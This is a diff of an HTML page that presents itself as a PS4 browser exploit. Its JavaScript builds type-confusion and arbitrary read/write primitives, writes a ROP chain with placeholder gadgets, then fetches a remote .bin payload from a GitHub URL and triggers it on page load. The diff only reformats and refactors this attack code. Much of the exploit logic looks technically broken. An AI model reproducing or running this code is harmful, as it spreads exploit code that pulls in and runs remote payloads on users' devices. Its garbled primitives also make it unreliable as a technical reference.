@@ -12,13 +12,8 @@
   <h1>Exploit PS4: JIT → ROP → Shellcode from .bin</h1>
   <div id="log">inicializando…</div>
   <script>
-    const logEl = document.getElementById('log');
-    let logData = "";
-    function log(msg) {
-      logData += msg + "\n";
-      logEl.textContent = logData;
-      logEl.scrollTop = logEl.scrollHeight;
-    }
+    const logEl = document.getElementById('log'); let logData = "";
+    function log(msg) { logData += msg + "\n"; logEl.textContent = logData; logEl.scrollTop = logEl.scrollHeight; }
 
     // float ↔ int primitives
     const buf = new ArrayBuffer(8);
@@ -27,7 +22,7 @@
     function f2i(f){ f64[0]=f; return BigInt(u32[0]) | (BigInt(u32[1])<<32n); }
     function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }
 
-    // 1) Type confusion gadget
+    // Type-confusion gadget
     function makeCorruptArray() {
       let arr=[1.1,1.1,1.1];
       let trigger={ valueOf(){ arr.length=1; return 3; } };
@@ -37,65 +32,49 @@
     let corrupt, addrof, fakeobj, arb_read, arb_write;
     function setupPrimitives() {
       log('[+] setupPrimitives()');
-      corrupt = makeCorruptArray();
-      log('    corrupt[1]='+corrupt[1]);
-      let leak=f2i(corrupt[1]);
-      log('    backing leak=0x'+leak.toString(16));
-      let buf2=new ArrayBuffer(0x2000);
-      let f2=new Float64Array(buf2);
-      corrupt[1]=i2f(leak);
-      addrof=obj=>{ f2[0]=obj; return f2i(corrupt[1]); };
-      fakeobj=addr=>{ corrupt[1]=i2f(addr); return new Float64Array(buf2)[0]; };
-      arb_read=addr=>{ corrupt[1]=i2f(addr); return f2i(f2[1]); };
-      arb_write=(addr,val)=>{ corrupt[1]=i2f(addr); f2[1]=i2f(val); };
+      corrupt = makeCorruptArray(); log('    corrupt[1]='+corrupt[1]);
+      let leak=f2i(corrupt[1]); log('    backing leak=0x'+leak.toString(16));
+      let buf2=new ArrayBuffer(0x2000), f2=new Float64Array(buf2);
+      corrupt[1] = i2f(leak);
+      addrof = obj=>{ f2[0]=obj; return f2i(corrupt[1]); };
+      fakeobj = addr=>{ corrupt[1]=i2f(addr); return new Float64Array(buf2)[0]; };
+      arb_read = addr=>{ corrupt[1]=i2f(addr); return f2i(f2[1]); };
+      arb_write = (addr,val)=>{ corrupt[1]=i2f(addr); f2[1]=i2f(val); };
       log('    primitives ready');
     }
 
-    let shellcodeAddr, rop;
+    let shellcodeAddr;
     function buildROP(sc_buf) {
-      log('[+] buildROP()');
-      shellcodeAddr=f2i(corrupt[1]);
-      log('    scbuf @0x'+shellcodeAddr.toString(16));
+      log('[+] buildROP()'); shellcodeAddr=f2i(corrupt[1]); log('    scbuf @0x'+shellcodeAddr.toString(16));
+      // placeholder gadgets
       let pop_rdi=0x10001000n, pop_rsi=0x10002000n, pop_rdx=0x10003000n, mprot=0x10004000n;
-      rop=[pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr];
+      let rop=[pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr];
       let dv=new DataView(sc_buf);
       for(let i=0;i<rop.length;i++) dv.setBigUint64(i*8,rop[i],true);
-      log('    ROPChain written');
+      log('    ROPChain written ('+rop.length+' entries)');
+      return rop;
     }
 
     async function injectAndRun() {
-      log('[+] injectAndRun()]');
+      log('[+] injectAndRun()');
       try {
         log('[+] fetching .bin...');
-        let r=await fetch('https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin');
-        if(!r.ok) throw new Error(r.status+'');
-        let payload=new Uint8Array(await r.arrayBuffer());
-        log('    .bin size='+payload.length+' bytes');
+        let r=await fetch('https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin'); if(!r.ok) throw new Error(r.status);
+        let payload=new Uint8Array(await r.arrayBuffer()); log('    .bin size='+payload.length+' bytes');
 
-        // allocate buffer sized for ROP+payload
-        let sc_buf=new ArrayBuffer(rop.length*8 + payload.length);
-        // write ROP
-        buildROP(sc_buf);
-        // write payload after ROP
+        // allocate buffer for ROP + payload
+        let sc_buf=new ArrayBuffer(8*8 + payload.length); // 8 entries in ROP
+        let rop = buildROP(sc_buf);
         let dv=new DataView(sc_buf);
-        for(let i=0;i<payload.length;i++) dv.setUint8(rop.length*8 + i,payload[i]);
+        for(let i=0;i<payload.length;i++) dv.setUint8(rop.length*8 + i, payload[i]);
         log('    .bin injected');
 
         log('[+] triggering ROP→shellcode');
-        // pivot into ROPChain -> shellcode
         fakeobj(shellcodeAddr);
-      } catch(e) {
-        log('!!! inject error: '+e);
-      }
+      } catch(e) { log('!!! inject error: '+e); }
     }
 
-    setTimeout(()=>{
-      log('=== Exploit start ===');
-      setupPrimitives();
-      // pre-build ROP with a temporary small buffer to set rop array
-      buildROP(new ArrayBuffer(rop.length*8));
-      injectAndRun().then(()=>log('=== done ==='));
-    },1000);
+    setTimeout(()=>{ log('=== Exploit start ==='); setupPrimitives(); injectAndRun().then(()=>log('=== done ===')); },1000);
   </script>
 </body>
 </html>
